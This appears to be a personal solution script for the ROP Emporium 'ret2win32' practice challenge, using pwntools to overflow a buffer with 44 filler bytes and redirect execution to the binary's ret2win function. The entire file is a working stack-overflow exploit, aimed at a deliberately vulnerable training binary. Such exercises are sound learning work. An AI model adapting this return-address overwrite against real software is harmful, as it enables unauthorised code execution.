from pwn import *
import struct


e = ELF("/home/osboxes/Downloads/ROP_Emporium_Challenges/ret2win32/ret2win32")
ret2winaddr = e.symbols["ret2win"]

crap = 'A' * 44
crap_len_in_bytes = len(crap.encode('utf-8'))
# eip = struct.pack("<Q",ret2winaddr)
# eip2 = "\x59\x86\x04\x08\x00\x00\x00\x00"
eip = p32(ret2winaddr)
print struct.pack("<Q",ret2winaddr)

io = e.process()

io.sendline(crap + eip)

io.interactive()
